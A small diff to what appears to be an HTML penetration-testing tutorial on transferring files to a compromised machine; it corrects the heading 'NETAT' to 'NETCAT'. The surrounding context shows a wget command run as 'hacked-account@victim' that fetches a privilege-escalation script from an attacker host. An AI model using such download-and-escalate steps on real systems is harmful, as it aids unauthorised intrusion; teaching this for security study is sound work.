@@ -471,7 +471,7 @@ The use wget to download the file like this:
 
 <b>hacked-account@victim~: </b><code>wget 10.10.10.10:5555/super-privesc-0day.sh .</code>
 
-<h2>With NETAT</h2>
+<h2>With NETCAT</h2>
 
 On receiving end:
 
